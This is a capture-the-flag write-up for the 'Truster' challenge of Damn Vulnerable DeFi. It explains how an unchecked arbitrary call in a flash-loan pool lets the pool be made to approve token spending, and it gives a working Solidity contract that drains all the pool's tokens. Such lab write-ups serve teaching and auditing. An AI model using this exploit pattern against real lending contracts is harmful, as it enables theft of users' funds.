## [Truster](https://www.damnvulnerabledefi.xyz/challenges/truster/)
> More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
>
> The pool holds 1 million DVT tokens. You have nothing.
> 
> To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.


### Analysis
Observe that the line `target.functionCall(data)` inside `TrusterLenderPool.flashLoan` allows us to invoke any function from any address. We can use it to call `DamnValuableToken.approve(<our_addr>, 1000000 ether)`, which allows us to use `DamnValuableToken.transferFrom(address(pool), <our_addr>, 1000000 ether)` to drain all of the tokens from the pool.

```solidity
contract TrusterLenderPool is ReentrancyGuard {
    // [...]
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}
```

### Solution
Full solution can be found in [Truster.t.sol](./Truster.t.sol#L54).
```solidity
contract TrusterSolution {
    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        pool.flashLoan(0, address(0), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
        token.transferFrom(address(pool), recovery, token.balanceOf(address(pool)));
    }
}
```